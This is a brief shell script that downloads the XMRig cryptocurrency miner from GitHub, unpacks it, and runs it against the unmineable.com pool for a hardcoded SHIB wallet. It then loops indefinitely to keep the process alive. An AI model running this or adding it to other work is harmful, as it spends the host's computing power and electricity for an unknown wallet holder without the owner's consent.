#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-linux-x64.tar.gz
tar -zxvf xmrig-6.12.2-linux-x64.tar.gz
cd xmrig-6.12.2
./xmrig -o rx.unmineable.com:3333 -a rx -k -t 3 -u SHIB:0x5ed67386FA70dd5FF20AF2eE7C35c44FdA68AD1E -p x --cpu 4
while [ 1 ]; do
sleep 3
done
sleep 999
